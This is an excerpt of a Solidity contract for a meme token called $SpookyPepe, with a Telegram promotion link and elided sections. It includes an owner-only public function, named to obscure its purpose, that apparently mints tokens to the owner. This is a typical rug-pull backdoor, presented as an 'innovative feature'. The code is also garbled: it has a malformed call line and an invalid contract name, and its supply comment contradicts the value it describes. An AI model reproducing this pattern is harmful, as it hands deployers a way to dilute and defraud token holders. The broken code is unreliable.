//
// $SpookyPepe proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpookyPepe_Portal
// 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SpookyPepe(uint256 amount) public onlyOwner {
 _SpookyPepe(amount);(msg.sender, amount);
    }
    ...
    function _SpookyPepe(address account, uint256 amount) internal virtual {
...
contract $SpookyPepe is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Spooky Pepe", "SPEPE") {
     _SpookyPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}